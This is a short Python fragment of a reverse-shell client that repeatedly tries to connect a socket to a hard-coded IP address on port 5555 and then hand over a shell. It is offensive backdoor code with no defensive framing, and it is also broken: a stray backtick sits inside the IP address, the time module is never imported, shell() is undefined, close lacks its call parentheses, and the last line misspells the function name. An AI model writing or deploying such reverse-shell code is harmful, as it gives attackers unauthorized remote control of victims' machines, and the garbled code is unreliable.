import socket

def connection():
    while True:
        time.sleep(20)
        try: 
            s.connect(('10.3`0.90.14', 5555))
            shell()
            s.close
            break
        except:
            connection() 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conncetion()
